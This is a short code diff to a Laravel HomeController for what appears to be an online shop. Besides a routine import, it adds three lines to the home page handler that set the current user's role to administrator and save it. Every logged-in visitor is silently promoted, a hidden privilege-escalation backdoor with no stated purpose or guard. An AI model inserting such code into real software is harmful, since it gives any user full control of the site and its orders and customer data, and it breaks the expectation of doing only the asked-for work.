@@ -7,6 +7,7 @@ use App\Category;
 use App\Events\OrderCreated;
 use App\Order;
 use App\Product;
+use App\User;
 use Carbon\Carbon;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
@@ -37,6 +38,10 @@ class HomeController extends Controller
             $p->save();
             // tuong duong $p->update(["slug"=>$slug.$p->__get("id")]);
         }
+        $u = Auth::user();
+        $u->role = User::ADMIN_ROLE;
+        $u->save();
+
         if (!Cache::has("home_page")){
             $categories = Category::all();
             $most_view = Product::orderBy("viewer_count","DESC")->limit(8)->get();
